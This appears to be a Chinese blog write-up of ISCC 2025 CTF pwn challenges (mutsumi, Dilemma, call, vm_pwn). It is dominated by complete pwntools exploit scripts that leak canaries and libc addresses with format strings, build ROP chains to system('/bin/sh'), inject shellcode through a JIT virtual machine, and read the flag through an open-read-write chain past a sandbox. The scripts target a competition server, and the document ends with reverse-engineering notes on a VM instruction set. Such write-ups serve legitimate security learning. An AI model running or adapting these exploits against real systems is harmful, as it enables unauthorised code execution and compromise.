class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;? &gt;&gt; &quot;</span></span><br><span class="line"></span><br><span class="line">sla(menu, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&quot;limited! &gt;&gt;&quot;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">data = <span class="string">b&quot;+%17$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;evidence! &gt;&gt; &quot;</span>,data)</span><br><span class="line">ru(<span class="string">b&quot;+&quot;</span>)</span><br><span class="line">canary = int16(r(<span class="number">18</span>))</span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line"><span class="comment"># sla(b&quot;chicken! &gt;&gt; &quot;,b&quot;d&quot;)</span></span><br><span class="line">sla(menu, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&quot;limited! &gt;&gt;&quot;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">data = <span class="string">b&quot;+%19$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;evidence! &gt;&gt; &quot;</span>,data)</span><br><span class="line">ru(<span class="string">b&quot;+&quot;</span>)</span><br><span class="line">main_addr = int16(r(<span class="number">14</span>)) - <span class="number">0x9e</span></span><br><span class="line">leak(<span class="string">&quot;main_addr&quot;</span>,main_addr)</span><br><span class="line">base = main_addr - elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">leak(<span class="string">&quot;base&quot;</span>,base)</span><br><span class="line">sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000000132f</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000001331</span></span><br><span class="line">ret = <span class="number">0x000000000000101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(base + pop_rdi) + p64(base + elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(base +elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(base + elf.sym[<span class="string">&quot;trial_adjourned&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([b&quot;a&quot;*0x48,canary,b&quot;a&quot;*8,pop_rdi,elf.got[&#x27;puts&#x27;],elf.plt[&#x27;puts&#x27;],elf.sym[&quot;trial_adjourned&quot;]])</span></span><br><span class="line">sla(<span class="string">b&quot;is adjourned&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">read = l64()</span><br><span class="line">leak(<span class="string">&quot;read&quot;</span>,read)</span><br><span class="line"></span><br><span class="line">libc_base = read - 	<span class="number">0x1147d0</span></span><br><span class="line">system = libc_base + 	<span class="number">0x50d70</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1d8678</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(base + pop_rdi) + p64(bin_sh) + p64(base+ret) +p64(system)</span><br><span class="line">sla(<span class="string">b&quot;is adjourned&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="mutsumi"><a href="#mutsumi" class="headerlink" title="mutsumi"></a>mutsumi</h2><p>还是vmpwn</p>
<p>通过mutsumi_jit函数解析用户输入的指令生成机器码并通过run_vm执行</p>
<p>vm结构体，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struc_VM</span>&#123;</span></span><br><span class="line">    <span class="type">void</span>* target;</span><br><span class="line">	<span class="type">int</span> type;</span><br><span class="line">	<span class="type">int</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm结构体由 指针、指令类型、指令 组成，后续在mutsumi_jit()进行处理</p>
<p>在main()函数中首先分配了两个chunk，一个赋给了VM</p>
<p><img data-src="/../images/image-20250515165114832.png" alt="image-20250515165114832"></p>
<p>这里分配了0x1000+0x10大小的空间给VM，通过下图观察VM的结构体</p>
<p><img data-src="/../images/image-20250515165552825.png" alt="image-20250515165552825"></p>
<p>主程序中，程序接受的每次输入有三种形式：</p>
<ul>
<li>saki,ido,to name </li>
<li>saki,ido nptr </li>
<li>saki,stop</li>
</ul>
<p><img data-src="/../images/image-20250515165731915.png" alt="image-20250515165731915"></p>
<p>由于atoi(nptr)，我们不能自由的生成指令 程序使用__isoc99_scanf(“%s”, s);读入，没有对长度进行检查</p>
<p>观察上图，我们可以通过溢出修改vm结构体 来控制要生成的指令 构造payload &#x3D; b’saki,stop’.ljust(0x20,b’\x00’) + ( p64(target) + p64(type) + p64(value) ) *n</p>
<p>在mutsumi_jit中对vm结构体进行处理，先将指针的值和saki进行比较，再根据type进行跳转，当type&#x3D;&#x3D;0 时，会调用imm2asm将value转换为机器码存入0x114000</p>
<p><img data-src="/../images/image-20250515170659475.png" alt="image-20250515170659475"></p>
<p>思路：</p>
<ul>
<li>通过溢出，修改指令</li>
<li>让程序执行mprotect()，再read()读入到mprotect()的区域</li>
<li>read()读入shellcode来get_shell</li>
</ul>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># time: 2025-05-14 21:54:30</span></span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">import <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">context</span>.<span class="title">terminal</span> =</span> [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12800</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="meta"># libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(data)</span><br><span class="line">sa      = lambda delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :p.sendline(data)</span><br><span class="line">sla     = lambda delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = lambda                    :p.recvline()</span><br><span class="line">ru      = lambda delims             :p.recvuntil(delims)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">leak    = lambda name, addr         :<span class="built_in">log</span>.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.format(name, addr))</span><br><span class="line">hs256   = lambda data               :sha256(str(data).encode()).hexdigest()</span><br><span class="line">l32     = lambda                    :u32(p.recvuntil(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l64     = lambda                    :u64(p.recvuntil(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = lambda                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = lambda                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">int16   = lambda data               :<span class="type">int</span>(data, <span class="number">16</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;come to help herher&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>):</span><br><span class="line">    sl(b<span class="string">&#x27;saki,ido&#x27;</span>)</span><br><span class="line">    sl(str(<span class="number">0x100</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">payload = b<span class="string">&#x27;saki,stop&#x27;</span>.ljust(<span class="number">0x20</span>, b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>) + p64(<span class="number">0x1011</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x1</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xb0e78948</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xf780f934</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\xc1\xe0\x08\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x31\xc6\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x6a\x07\x5a\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x31\xc0\x52\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x58\x04\x03\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x0f\x05\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x87\xf7\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x87\xd7\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x5f\x0f\x05\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\xff\xe4\x00\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x000001b8</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;\x90&#x27;</span> * <span class="number">0x10</span> + <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="Dilemma"><a href="#Dilemma" class="headerlink" title="Dilemma"></a>Dilemma</h2><p>栈迁移+fmt+orw</p>
<p>在自定义的init()函数中开启了沙箱</p>
<p><img data-src="/../images/image-20250517141351937.png" alt="image-20250517141351937"></p>
<p>可以看到禁用了sys_number和execve，那就只能用orw来读flag</p>
<p>在看menu()函数，看到这个dummy()中什么都没有那就是设计的gadgets了</p>
<p><img data-src="/../images/image-20250517141407851.png" alt="image-20250517141407851"></p>
<p>查看func_1()</p>
<p><img data-src="/../images/image-20250517141458439.png" alt="image-20250517141458439"></p>
<p>这里有两次输入，而且第二个只能用一次，有溢出</p>
<p>在func_0中明显存在溢出</p>
<p><img data-src="/../images/image-20250517141515421.png" alt="image-20250517141515421"></p>
<p>在iscc中flag文件名为flag或flag.txt</p>
<p>查找gadgets</p>
<p><img data-src="/../images/image-20250517141323897.png" alt="image-20250517141323897"></p>
<p>缺少了rdx的gadgets，在libc文件中找通过泄露可以libc为libc6_2.35-0ubuntu3.8_amd64.so</p>
<p><img data-src="/../images/image-20250517141303474.png" alt="image-20250517141303474"></p>
<p>思路：</p>
<ul>
<li>在func_1()中泄露canary和libc</li>
<li>进入func_0()中栈迁移到bss段，将flag.txt写入</li>
<li>在rop回到func_0()中栈溢出写入orw</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-16 08:10:06</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12500</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6_2.35-0ubuntu3.8_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript = &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040119a</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">bss = <span class="number">0x404000</span> + <span class="number">0x900</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x000000000040119c</span></span><br><span class="line">sla(<span class="string">b&quot;where are you go?&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">fmt = <span class="string">b&#x27;%39$p%11$p&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">b&quot;Enter you password:&quot;</span>,fmt)</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_start = int16(r(<span class="number">12</span>)) - <span class="number">128</span></span><br><span class="line">libc_base = libc_start- libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">again = <span class="number">0x4012BA</span></span><br><span class="line">canary = int16(r(<span class="number">16</span>))</span><br><span class="line">sla(<span class="string">b&quot;your password:&quot;</span>,<span class="string">b&quot;111&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;where are you go?&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(bss+<span class="number">0x30</span>) + p64(<span class="number">0x4011C9</span>)</span><br><span class="line">sla(<span class="string">b&quot;to talk about&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">orw = <span class="string">b&#x27;./flag.txt&#x27;</span></span><br><span class="line">orw = orw.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(bss) +p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(bss+<span class="number">0x200</span>) + p64(<span class="number">0</span>) +p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(bss+<span class="number">0x200</span>) + p64(<span class="number">0</span>) +p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(orw)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sl(orw)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>ret2libc，泄露的write地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-01 15:06:07</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12100</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6_2.31-0ubuntu9.17_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">padding = <span class="number">0x60</span>+<span class="number">8</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401273</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401271</span> </span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*padding + p64(pop_rdi_ret) +p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">sl(payload1)</span><br><span class="line">write = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*padding + p64(pop_rdi_ret) +p64(bin_sh) + p64(system)</span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="vm-pwn"><a href="#vm-pwn" class="headerlink" title="vm_pwn"></a>vm_pwn</h2><p>逆向记录：</p>
<ul>
<li>0x4090 memory</li>
<li>0x4098 read(0, opcode, 0x1000uLL);的返回值—-&gt;ax</li>
</ul>
<blockquote>
<p>read() 函数的返回值含义如下：</p>
<ul>
<li><p>返回值为正整数：表示实际读取到的字节数。</p>
</li>
<li><p>返回值为0：表示已到达文件末尾（EOF），没有更多数据可读。</p>
</li>
<li><p>返回值为-1：表示读取失败，发生了错误（此时可以通过 errno 查看具体错误原因）。</p>
</li>
</ul>
</blockquote>
<ul>
<li>0x4060 array</li>
</ul>
<h3 id="指令集逆向解析"><a href="#指令集逆向解析" class="headerlink" title="指令集逆向解析"></a><strong>指令集逆向解析</strong></h3><h4 id="1-基础指令"><a href="#1-基础指令" class="headerlink" title="1. 基础指令"></a><strong>1. 基础指令</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x00</strong></td>
<td align="center"><code>LOAD_CONST</code></td>
<td align="center"><code>目标寄存器地址</code></td>
<td align="center">从内存加载常量到目标寄存器（<code>sub_132C</code>读取8字节）</td>
<td align="center"><code>case 0u</code></td>
</tr>
<tr>
<td align="center"><strong>0x01</strong></td>
<td align="center"><code>LOAD_MEM</code></td>
<td align="center"><code>源地址, 目标地址</code></td>
<td align="center">从内存地址加载值到寄存器（<code>*reg[v12]</code>解引用操作）</td>
<td align="center"><code>case 1u</code></td>
</tr>
<tr>
<td align="center"><strong>0x02</strong></td>
<td align="center"><code>STORE_MEM</code></td>
<td align="center"><code>目标地址, 源值</code></td>
<td align="center">将寄存器值存储到内存地址（<code>*reg[fetch] = reg[v11]</code>）</td>
<td align="center"><code>case 2u</code></td>
</tr>
<tr>
<td align="center"><strong>0x03</strong></td>
<td align="center"><code>MOV</code></td>
<td align="center"><code>目标寄存器, 源值</code></td>
<td align="center">寄存器间数据传输（直接复制值）</td>
<td align="center"><code>case 3u</code></td>
</tr>
<tr>
<td align="center"><strong>0x09</strong></td>
<td align="center"><code>NOP</code></td>
<td align="center">无</td>
<td align="center">空操作</td>
<td align="center"><code>case 9u</code></td>
</tr>
</tbody></table>
<h4 id="2-控制流指令"><a href="#2-控制流指令" class="headerlink" title="2. 控制流指令"></a><strong>2. 控制流指令</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x04</strong></td>
<td align="center"><code>CALL</code></td>
<td align="center">无</td>
<td align="center">调用子函数（<code>sub_1393</code>压栈返回地址）</td>
<td align="center"><code>case 4u</code></td>
</tr>
<tr>
<td align="center"><strong>0x07</strong></td>
<td align="center"><code>JMP</code></td>
<td align="center"><code>目标地址</code></td>
<td align="center">直接跳转到目标地址（修改PC指针）</td>
<td align="center"><code>case 7u</code></td>
</tr>
<tr>
<td align="center"><strong>0x08</strong></td>
<td align="center"><code>EXIT</code></td>
<td align="center">无</td>
<td align="center">退出虚拟机（返回主函数）</td>
<td align="center"><code>case 8u</code></td>
</tr>
</tbody></table>
